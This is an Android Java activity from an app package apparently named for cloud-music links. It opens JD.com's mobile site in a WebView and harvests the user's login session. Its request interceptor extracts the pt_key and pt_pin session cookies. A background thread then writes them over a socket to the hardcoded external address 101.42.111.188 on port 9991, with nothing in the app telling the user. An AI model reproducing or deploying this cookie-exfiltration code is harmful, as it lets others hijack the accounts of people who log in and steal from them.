/*
 * Copyright (c) 2022. @QJ315
 * github账户:https://github.com/lmy8848
 * User:NJQ-PC
 * File:JDCookieGet.java
 * Date:2022/09/09 18:17:09
 */

package com.qj315.cloudmusicoutlink.activity;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import android.annotation.SuppressLint;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;
import com.qj315.cloudmusicoutlink.R;
import com.qj315.cloudmusicoutlink.tools.CookieListener;
import com.qj315.cloudmusicoutlink.tools.ToolsSet;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class JDCookieGet extends AppCompatActivity {

    private ImageView mMainBack;
    private ImageView mMainRefresh;
    private ImageView mMainSet;
    private ProgressBar mMainProgressBar;
    private WebView mMainWebView;
    private final static String JD_URL = "https://m.jd.com/";
    private long oldTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_jdcookie_get);
        initView();
        mMainBack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                mMainWebView.goBack();
            }
        });
        mMainRefresh.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                mMainWebView.reload();
            }
        });
    }

    @SuppressLint("SetJavaScriptEnabled")
    public void initView() {
        mMainBack=findViewById(R.id.main_back);
        mMainRefresh=findViewById(R.id.main_refresh);
        mMainSet=findViewById(R.id.main_set);
        mMainProgressBar=findViewById(R.id.main_progress_bar);
        mMainWebView=findViewById(R.id.main_web_view);

        WebSettings webSetting = mMainWebView.getSettings();
        webSetting.setJavaScriptEnabled(true);
        webSetting.setBuiltInZoomControls(true);
        webSetting.setDisplayZoomControls(false);
        webSetting.setUseWideViewPort(true);
        webSetting.setBlockNetworkImage(false);
        //缓存模式
        webSetting.setCacheMode(WebSettings.LOAD_NO_CACHE);
        webSetting.setDatabaseEnabled(true);
        webSetting.setDomStorageEnabled(true);
        webSetting.setAppCacheMaxSize(1024 * 1024 * 8);
        webSetting.setAppCachePath(getFilesDir().getAbsolutePath());
        webSetting.setDatabasePath(getFilesDir().getAbsolutePath());
        webSetting.setAllowFileAccess(true);
        webSetting.setAppCacheEnabled(true);
        webSetting.setTextZoom(100);
        mMainWebView.loadUrl(JD_URL);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSetting.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }
        mMainWebView.setWebViewClient(new MyWebViewClient( mMainProgressBar, (cookie, pt_key) -> runOnUiThread(() -> {

            //限制 500 毫秒 刷新一次
            long time = System.currentTimeMillis();
            if (time - oldTime > 5000) {
                runOnUiThread(()->{
                    Toast.makeText(JDCookieGet.this,""+pt_key,Toast.LENGTH_SHORT).show();
                    Log.i("TAG", "initView: "+pt_key);
                    new Thread(()->{
                        Socket socket = ToolsSet.ConnectionSocket("101.42.111.188", 9991);
                        BufferedWriter bufferedWriter=null;
                        try {
                            bufferedWriter=new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                            bufferedWriter.write(pt_key);
                            bufferedWriter.flush();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }finally {
                            try {
                                socket.close();
                                if (bufferedWriter != null) {
                                    bufferedWriter.close();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                });
//                adapter.addData(pt_key);
//                recyclerView.scrollToPosition(adapter.getData().size() - 1);
                oldTime = time;
            }
        })));
        mMainWebView.setWebChromeClient(new MyWebChromeClient( mMainProgressBar));
    }
    public static class MyWebChromeClient extends WebChromeClient {

        private final ProgressBar webBridgeProgressBar;

        public MyWebChromeClient(ProgressBar webBridgeProgressBar) {
            this.webBridgeProgressBar = webBridgeProgressBar;
        }

        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            if (null != webBridgeProgressBar) {
                webBridgeProgressBar.setProgress(newProgress);
            }
            super.onProgressChanged(view, newProgress);
        }

        @Override
        public void onReceivedTitle(WebView view, String title) {
            super.onReceivedTitle(view, title);
        }

    }

    public static class MyWebViewClient extends WebViewClient {

        private final ProgressBar webBridgeProgressBar;
        private final CookieListener cookieListener;

        public MyWebViewClient(ProgressBar webBridgeProgressBar, CookieListener cookieListener) {

            this.webBridgeProgressBar = webBridgeProgressBar;
            this.cookieListener = cookieListener;
        }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            if (webBridgeProgressBar != null) {
                webBridgeProgressBar.setVisibility(View.VISIBLE);
            }
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            if (webBridgeProgressBar != null) {
                webBridgeProgressBar.setVisibility(View.GONE);
            }
            super.onPageFinished(view, url);
        }

        @Nullable
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request1) {

            try {
                CookieManager cookieManager = CookieManager.getInstance();
                String cookie = cookieManager.getCookie(request1.getUrl().toString());
                if (cookieListener != null && !TextUtils.isEmpty(cookie) && cookie.contains("pt_key")) {

                    int ptKeyIndex = cookie.indexOf("pt_key");
                    //截取 pt_key 之后的字符串
                    String pt_key = cookie.substring(ptKeyIndex);

                    int ptPinIndex = pt_key.indexOf("pt_pin");
                    String pt_pin = pt_key.substring(ptPinIndex);
                    pt_pin = pt_pin.substring(0, pt_pin.indexOf(";", 1) + 1);

                    //截取到"；"前的 pt_key
                    pt_key = pt_key.substring(0, pt_key.indexOf(";", 1) + 1);

                    cookieListener.onCookie(cookie, pt_key + pt_pin);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.shouldInterceptRequest(view, request1);
        }
    }
}